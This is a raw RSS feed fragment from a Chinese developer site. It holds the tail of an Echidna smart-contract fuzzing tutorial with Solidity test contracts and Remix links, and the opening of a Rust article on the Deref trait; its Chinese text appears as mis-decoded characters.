    // æ£€æŸ¥é»˜è®¤å‘ä»¶äººã€‚å‘ä»¶äººåº”ä¸º3ä¸ªé»˜è®¤è´¦æˆ·ä¹‹ä¸€ã€‚
    function echidna_test_sender() public view returns (bool) {
        for (uint256 i<span class="hljs-comment">; i &lt; 3; i++) {</span>
            if (<span class="hljs-attr">sender</span> == senders[i]) {
                return true<span class="hljs-comment">;</span>
            }
        }
        return false<span class="hljs-comment">;</span>
    }
}
</code></pre>
<h3 data-id="heading-2">Try on Remix</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fremix.ethereum.org%2F%3F%23code%3DLy8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4yNjsKCi8qCmRvY2tlciBydW4gLWl0IC0tcm0gLXYgJFBXRDovY29kZSB0cmFpbG9mYml0cy9ldGgtc2VjdXJpdHktdG9vbGJveAplY2hpZG5hIEVjaGlkbmFUZXN0VGltZUFuZENhbGxlci5zb2wgLS1jb250cmFjdCBFY2hpZG5hVGVzdFRpbWVBbmRDYWxsZXIKKi8KY29udHJhY3QgRWNoaWRuYVRlc3RUaW1lQW5kQ2FsbGVyIHsKICAgIGJvb2wgcHJpdmF0ZSBwYXNzID0gdHJ1ZTsKICAgIHVpbnQyNTYgcHJpdmF0ZSBjcmVhdGVkQXQgPSBibG9jay50aW1lc3RhbXA7CgogICAgLyoKICAgIHRlc3Qgd2lsbCBmYWlsIGlmIEVjaGlkbmEgY2FuIGNhbGwgc2V0RmFpbCgpCiAgICB0ZXN0IHdpbGwgcGFzcyBvdGhlcndpc2UKICAgICovCiAgICBmdW5jdGlvbiBlY2hpZG5hX3Rlc3RfcGFzcygpIHB1YmxpYyB2aWV3IHJldHVybnMgKGJvb2wpIHsKICAgICAgICByZXR1cm4gcGFzczsKICAgIH0KCiAgICBmdW5jdGlvbiBzZXRGYWlsKCkgZXh0ZXJuYWwgewogICAgICAgIC8qCiAgICAgICAgRWNoaWRuYSBjYW4gY2FsbCB0aGlzIGZ1bmN0aW9uIGlmIGRlbGF5IDw9IG1heCBibG9jayBkZWxheQogICAgICAgIE90aGVyd2lzZSBFY2hpZG5hIHdpbGwgbm90IGJlIGFibGUgdG8gY2FsbCB0aGlzIGZ1bmN0aW9uLgogICAgICAgIE1heCBibG9jayBkZWxheSBjYW4gYmUgZXh0ZW5kZWQgYnkgc3BlY2lmeWluZyBpdCBpbiBhIGNvbmZpZ3VyYXRpb24gZmlsZS4KICAgICAgICAqLwogICAgICAgIHVpbnQyNTYgZGVsYXkgPSA3IGRheXM7CiAgICAgICAgcmVxdWlyZShibG9jay50aW1lc3RhbXAgPj0gY3JlYXRlZEF0ICsgZGVsYXkpOwogICAgICAgIHBhc3MgPSBmYWxzZTsKICAgIH0KCiAgICAvLyBEZWZhdWx0IHNlbmRlcnMKICAgIC8vIENoYW5nZSB0aGUgYWRkcmVzc2VzIHRvIHNlZSB0aGUgdGVzdCBmYWlsCiAgICBhZGRyZXNzWzNdIHByaXZhdGUgc2VuZGVycyA9CiAgICAgICAgW2FkZHJlc3MoMHgxMDAwMCksIGFkZHJlc3MoMHgyMDAwMCksIGFkZHJlc3MoMHgzMDAwMCldOwoKICAgIGFkZHJlc3MgcHJpdmF0ZSBzZW5kZXIgPSBtc2cuc2VuZGVyOwoKICAgIC8vIFBhc3MgX3NlbmRlciBhcyBpbnB1dCBhbmQgcmVxdWlyZSBtc2cuc2VuZGVyID09IF9zZW5kZXIKICAgIC8vIHRvIHNlZSBfc2VuZGVyIGZvciBjb3VudGVyIGV4YW1wbGUKICAgIGZ1bmN0aW9uIHNldFNlbmRlcihhZGRyZXNzIF9zZW5kZXIpIGV4dGVybmFsIHsKICAgICAgICByZXF1aXJlKF9zZW5kZXIgPT0gbXNnLnNlbmRlcik7CiAgICAgICAgc2VuZGVyID0gbXNnLnNlbmRlcjsKICAgIH0KCiAgICAvLyBDaGVjayBkZWZhdWx0IHNlbmRlcnMuIFNlbmRlciBzaG91bGQgYmUgb25lIG9mIHRoZSAzIGRlZmF1bHQgYWNjb3VudHMuCiAgICBmdW5jdGlvbiBlY2hpZG5hX3Rlc3Rfc2VuZGVyKCkgcHVibGljIHZpZXcgcmV0dXJucyAoYm9vbCkgewogICAgICAgIGZvciAodWludDI1NiBpOyBpIDwgMzsgaSsrKSB7CiAgICAgICAgICAgIGlmIChzZW5kZXIgPT0gc2VuZGVyc1tpXSkgewogICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQp9Cg%3D%3D" target="_blank" title="https://remix.ethereum.org/?#code=Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4yNjsKCi8qCmRvY2tlciBydW4gLWl0IC0tcm0gLXYgJFBXRDovY29kZSB0cmFpbG9mYml0cy9ldGgtc2VjdXJpdHktdG9vbGJveAplY2hpZG5hIEVjaGlkbmFUZXN0VGltZUFuZENhbGxlci5zb2wgLS1jb250cmFjdCBFY2hpZG5hVGVzdFRpbWVBbmRDYWxsZXIKKi8KY29udHJhY3QgRWNoaWRuYVRlc3RUaW1lQW5kQ2FsbGVyIHsKICAgIGJvb2wgcHJpdmF0ZSBwYXNzID0gdHJ1ZTsKICAgIHVpbnQyNTYgcHJpdmF0ZSBjcmVhdGVkQXQgPSBibG9jay50aW1lc3RhbXA7CgogICAgLyoKICAgIHRlc3Qgd2lsbCBmYWlsIGlmIEVjaGlkbmEgY2FuIGNhbGwgc2V0RmFpbCgpCiAgICB0ZXN0IHdpbGwgcGFzcyBvdGhlcndpc2UKICAgICovCiAgICBmdW5jdGlvbiBlY2hpZG5hX3Rlc3RfcGFzcygpIHB1YmxpYyB2aWV3IHJldHVybnMgKGJvb2wpIHsKICAgICAgICByZXR1cm4gcGFzczsKICAgIH0KCiAgICBmdW5jdGlvbiBzZXRGYWlsKCkgZXh0ZXJuYWwgewogICAgICAgIC8qCiAgICAgICAgRWNoaWRuYSBjYW4gY2FsbCB0aGlzIGZ1bmN0aW9uIGlmIGRlbGF5IDw9IG1heCBibG9jayBkZWxheQogICAgICAgIE90aGVyd2lzZSBFY2hpZG5hIHdpbGwgbm90IGJlIGFibGUgdG8gY2FsbCB0aGlzIGZ1bmN0aW9uLgogICAgICAgIE1heCBibG9jayBkZWxheSBjYW4gYmUgZXh0ZW5kZWQgYnkgc3BlY2lmeWluZyBpdCBpbiBhIGNvbmZpZ3VyYXRpb24gZmlsZS4KICAgICAgICAqLwogICAgICAgIHVpbnQyNTYgZGVsYXkgPSA3IGRheXM7CiAgICAgICAgcmVxdWlyZShibG9jay50aW1lc3RhbXAgPj0gY3JlYXRlZEF0ICsgZGVsYXkpOwogICAgICAgIHBhc3MgPSBmYWxzZTsKICAgIH0KCiAgICAvLyBEZWZhdWx0IHNlbmRlcnMKICAgIC8vIENoYW5nZSB0aGUgYWRkcmVzc2VzIHRvIHNlZSB0aGUgdGVzdCBmYWlsCiAgICBhZGRyZXNzWzNdIHByaXZhdGUgc2VuZGVycyA9CiAgICAgICAgW2FkZHJlc3MoMHgxMDAwMCksIGFkZHJlc3MoMHgyMDAwMCksIGFkZHJlc3MoMHgzMDAwMCldOwoKICAgIGFkZHJlc3MgcHJpdmF0ZSBzZW5kZXIgPSBtc2cuc2VuZGVyOwoKICAgIC8vIFBhc3MgX3NlbmRlciBhcyBpbnB1dCBhbmQgcmVxdWlyZSBtc2cuc2VuZGVyID09IF9zZW5kZXIKICAgIC8vIHRvIHNlZSBfc2VuZGVyIGZvciBjb3VudGVyIGV4YW1wbGUKICAgIGZ1bmN0aW9uIHNldFNlbmRlcihhZGRyZXNzIF9zZW5kZXIpIGV4dGVybmFsIHsKICAgICAgICByZXF1aXJlKF9zZW5kZXIgPT0gbXNnLnNlbmRlcik7CiAgICAgICAgc2VuZGVyID0gbXNnLnNlbmRlcjsKICAgIH0KCiAgICAvLyBDaGVjayBkZWZhdWx0IHNlbmRlcnMuIFNlbmRlciBzaG91bGQgYmUgb25lIG9mIHRoZSAzIGRlZmF1bHQgYWNjb3VudHMuCiAgICBmdW5jdGlvbiBlY2hpZG5hX3Rlc3Rfc2VuZGVyKCkgcHVibGljIHZpZXcgcmV0dXJucyAoYm9vbCkgewogICAgICAgIGZvciAodWludDI1NiBpOyBpIDwgMzsgaSsrKSB7CiAgICAgICAgICAgIGlmIChzZW5kZXIgPT0gc2VuZGVyc1tpXSkgewogICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQp9Cg==" ref="nofollow noopener noreferrer">EchidnaTestTimeAndCaller.sol</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fremix.ethereum.org%2F%3F%23code%3DLy8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4yNjsKCi8qCmVjaGlkbmEgVGVzdEVjaGlkbmEuc29sIC0tY29udHJhY3QgVGVzdENvdW50ZXIKKi8KY29udHJhY3QgQ291bnRlciB7CiAgICB1aW50MjU2IHB1YmxpYyBjb3VudDsKCiAgICBmdW5jdGlvbiBpbmMoKSBleHRlcm5hbCB7CiAgICAgICAgY291bnQgKz0gMTsKICAgIH0KCiAgICBmdW5jdGlvbiBkZWMoKSBleHRlcm5hbCB7CiAgICAgICAgY291bnQgLT0gMTsKICAgIH0KfQoKY29udHJhY3QgVGVzdENvdW50ZXIgaXMgQ291bnRlciB7CiAgICBmdW5jdGlvbiBlY2hpZG5hX3Rlc3RfdHJ1ZSgpIHB1YmxpYyB2aWV3IHJldHVybnMgKGJvb2wpIHsKICAgICAgICByZXR1cm4gdHJ1ZTsKICAgIH0KCiAgICBmdW5jdGlvbiBlY2hpZG5hX3Rlc3RfZmFsc2UoKSBwdWJsaWMgdmlldyByZXR1cm5zIChib29sKSB7CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQoKICAgIGZ1bmN0aW9uIGVjaGlkbmFfdGVzdF9jb3VudCgpIHB1YmxpYyB2aWV3IHJldHVybnMgKGJvb2wpIHsKICAgICAgICAvLyBIZXJlIHdlIGFyZSB0ZXN0aW5nIHRoYXQgQ291bnRlci5jb3VudCBzaG91bGQgYWx3YXlzIGJlIDw9IDUuCiAgICAgICAgLy8gVGVzdCB3aWxsIGZhaWwuIEVjaGlkbmEgaXMgc21hcnQgZW5vdWdoIHRvIGNhbGwgQ291bnRlci5pbmMoKSBtb3JlCiAgICAgICAgLy8gdGhhbiA1IHRpbWVzLgogICAgICAgIHJldHVybiBjb3VudCA8PSA1OwogICAgfQp9CgovKgplY2hpZG5hIFRlc3RFY2hpZG5hLnNvbCAtLWNvbnRyYWN0IFRlc3RBc3NlcnQgLS10ZXN0LW1vZGUgYXNzZXJ0aW9uCiovCmNvbnRyYWN0IFRlc3RBc3NlcnQgewogICAgZnVuY3Rpb24gdGVzdF9hc3NlcnQodWludDI1NiBfaSkgZXh0ZXJuYWwgewogICAgICAgIGFzc2VydChfaSA8IDEwKTsKICAgIH0KCiAgICAvLyBNb3JlIGNvbXBsZXggZXhhbXBsZQogICAgZnVuY3Rpb24gYWJzKHVpbnQyNTYgeCwgdWludDI1NiB5KSBwcml2YXRlIHB1cmUgcmV0dXJucyAodWludDI1NikgewogICAgICAgIGlmICh4ID49IHkpIHsKICAgICAgICAgICAgcmV0dXJuIHggLSB5OwogICAgICAgIH0KICAgICAgICByZXR1cm4geSAtIHg7CiAgICB9CgogICAgZnVuY3Rpb24gdGVzdF9hYnModWludDI1NiB4LCB1aW50MjU2IHkpIGV4dGVybmFsIHsKICAgICAgICB1aW50MjU2IHogPSBhYnMoeCwgeSk7CiAgICAgICAgaWYgKHggPj0geSkgewogICAgICAgICAgICBhc3NlcnQoeiA8PSB4KTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBhc3NlcnQoeiA8PSB5KTsKICAgICAgICB9CiAgICB9Cn0K" target="_blank" title="https://remix.ethereum.org/?#code=Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4yNjsKCi8qCmVjaGlkbmEgVGVzdEVjaGlkbmEuc29sIC0tY29udHJhY3QgVGVzdENvdW50ZXIKKi8KY29udHJhY3QgQ291bnRlciB7CiAgICB1aW50MjU2IHB1YmxpYyBjb3VudDsKCiAgICBmdW5jdGlvbiBpbmMoKSBleHRlcm5hbCB7CiAgICAgICAgY291bnQgKz0gMTsKICAgIH0KCiAgICBmdW5jdGlvbiBkZWMoKSBleHRlcm5hbCB7CiAgICAgICAgY291bnQgLT0gMTsKICAgIH0KfQoKY29udHJhY3QgVGVzdENvdW50ZXIgaXMgQ291bnRlciB7CiAgICBmdW5jdGlvbiBlY2hpZG5hX3Rlc3RfdHJ1ZSgpIHB1YmxpYyB2aWV3IHJldHVybnMgKGJvb2wpIHsKICAgICAgICByZXR1cm4gdHJ1ZTsKICAgIH0KCiAgICBmdW5jdGlvbiBlY2hpZG5hX3Rlc3RfZmFsc2UoKSBwdWJsaWMgdmlldyByZXR1cm5zIChib29sKSB7CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQoKICAgIGZ1bmN0aW9uIGVjaGlkbmFfdGVzdF9jb3VudCgpIHB1YmxpYyB2aWV3IHJldHVybnMgKGJvb2wpIHsKICAgICAgICAvLyBIZXJlIHdlIGFyZSB0ZXN0aW5nIHRoYXQgQ291bnRlci5jb3VudCBzaG91bGQgYWx3YXlzIGJlIDw9IDUuCiAgICAgICAgLy8gVGVzdCB3aWxsIGZhaWwuIEVjaGlkbmEgaXMgc21hcnQgZW5vdWdoIHRvIGNhbGwgQ291bnRlci5pbmMoKSBtb3JlCiAgICAgICAgLy8gdGhhbiA1IHRpbWVzLgogICAgICAgIHJldHVybiBjb3VudCA8PSA1OwogICAgfQp9CgovKgplY2hpZG5hIFRlc3RFY2hpZG5hLnNvbCAtLWNvbnRyYWN0IFRlc3RBc3NlcnQgLS10ZXN0LW1vZGUgYXNzZXJ0aW9uCiovCmNvbnRyYWN0IFRlc3RBc3NlcnQgewogICAgZnVuY3Rpb24gdGVzdF9hc3NlcnQodWludDI1NiBfaSkgZXh0ZXJuYWwgewogICAgICAgIGFzc2VydChfaSA8IDEwKTsKICAgIH0KCiAgICAvLyBNb3JlIGNvbXBsZXggZXhhbXBsZQogICAgZnVuY3Rpb24gYWJzKHVpbnQyNTYgeCwgdWludDI1NiB5KSBwcml2YXRlIHB1cmUgcmV0dXJucyAodWludDI1NikgewogICAgICAgIGlmICh4ID49IHkpIHsKICAgICAgICAgICAgcmV0dXJuIHggLSB5OwogICAgICAgIH0KICAgICAgICByZXR1cm4geSAtIHg7CiAgICB9CgogICAgZnVuY3Rpb24gdGVzdF9hYnModWludDI1NiB4LCB1aW50MjU2IHkpIGV4dGVybmFsIHsKICAgICAgICB1aW50MjU2IHogPSBhYnMoeCwgeSk7CiAgICAgICAgaWYgKHggPj0geSkgewogICAgICAgICAgICBhc3NlcnQoeiA8PSB4KTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBhc3NlcnQoeiA8PSB5KTsKICAgICAgICB9CiAgICB9Cn0K" ref="nofollow noopener noreferrer">TestEchidna.sol</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Rustå®ç”¨å·¥å…·ç‰¹å‹-Deref ä¸ DerefMut]]></title>    <link>https://juejin.cn/post/7596943803933786152</link>    <guid>https://juejin.cn/post/7596943803933786152</guid>    <pubDate>2026-01-20T01:13:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596943803933786152" data-draft-id="7596932640726827043" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Rustå®ç”¨å·¥å…·ç‰¹å‹-Deref ä¸ DerefMut"/> <meta itemprop="keywords" content="åç«¯,Rust"/> <meta itemprop="datePublished" content="2026-01-20T01:13:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å™—å™œå™—å™œå•ª"/> <meta itemprop="url" content="https://juejin.cn/user/4037062427148462"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Rustå®ç”¨å·¥å…·ç‰¹å‹-Deref ä¸ DerefMut
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4037062427148462/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å™—å™œå™—å™œå•ª
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T01:13:42.000Z" title="Tue Jan 20 2026 01:13:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½ æœ‰æ²¡æœ‰æƒ³è¿‡ï¼Œä¸ºä»€ä¹ˆ <code>String</code> èƒ½ç›´æ¥ä¼ ç»™æ¥å— <code>&amp;str</code> çš„å‡½æ•°ï¼Ÿä¸ºä»€ä¹ˆ <code>Box&lt;T&gt;</code> èƒ½åƒæ™®é€šå€¼ä¸€æ ·è°ƒç”¨æ–¹æ³•ï¼Ÿ</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">print_text</span>(s: &amp;<span class="hljs-type">str</span>) {
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"{}"</span>, s);
}

<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">my_string</span> = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">"hello"</span>);
<span class="hljs-title function_ invoke__">print_text</span>(&amp;my_string);  <span class="hljs-comment">// ä¸ºä»€ä¹ˆ &amp;String èƒ½ä¼ ç»™ &amp;strï¼Ÿ</span>
</code></pre>
<p>ç­”æ¡ˆå°±æ˜¯ <code>Deref</code> traitã€‚å®ƒåšäº†ä¸¤ä»¶äº‹ï¼š</p>
<ol>
<li><strong>è®©ä½ çš„ç±»å‹æ”¯æŒ <code>*</code> è§£å¼•ç”¨</strong>ï¼š<code>*boxed</code> èƒ½æ‹¿åˆ° Box é‡Œçš„å€¼</li>
<li><strong>è‡ªåŠ¨ç±»å‹è½¬æ¢</strong>ï¼š<code>&amp;String</code> è‡ªåŠ¨å˜æˆ <code>&amp;str</code>ï¼Œ<code>&amp;Vec&lt;T&gt;</code> è‡ªåŠ¨å˜æˆ <code>&amp;[T]</code></li>
</ol>
<p>ç¬¬äºŒç‚¹æ‰æ˜¯ <code>Deref</code> çš„æ€æ‰‹é”â€”â€”ä½ å†™ API æ—¶åªéœ€è¦æ¥å— <code>&amp;str</code>ï¼Œè°ƒç”¨è€…ä¼  <code>String</code>ã€<code>&amp;str</code>ã€<code>Box&lt;str&gt;</code> éƒ½è¡Œï¼ŒRust ä¼šè‡ªåŠ¨å¸®ä½ è½¬æ¢ã€‚</p>
<h2 data-id="heading-0">1. æ ¸å¿ƒæ¦‚å¿µ</h2>
<h3 data-id="heading-1">Deref åˆ°åº•æ˜¯ä»€ä¹ˆï¼Ÿ</h3>
<p>å…ˆçœ‹ä¸€ä¸ªæœ€ç®€å•çš„ä¾‹å­ï¼š</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">x</span> = <span class="hljs-number">5</span>;
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">r</span> = &amp;x;      <span class="hljs-comment">// r æ˜¯å¼•ç”¨</span>
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">y</span> = *r;      <span class="hljs-comment">// *r è§£å¼•ç”¨ï¼Œæ‹¿åˆ° 5</span>
</code></pre>
<p>å¼•ç”¨å¤©ç”Ÿæ”¯æŒ <code>*</code> è§£å¼•ç”¨ã€‚ä½†å¦‚æœä½ è‡ªå·±å†™äº†ä¸ªæ™ºèƒ½æŒ‡é’ˆç±»å‹ï¼Œæ€ä¹ˆè®©å®ƒä¹Ÿèƒ½ç”¨ <code>*</code>ï¼Ÿ</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">MyBox</span>&lt;T&gt;(T);

<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">boxed</span> = <span class="hljs-title function_ invoke__">MyBox</span>(<span class="hljs-number">5</span>);
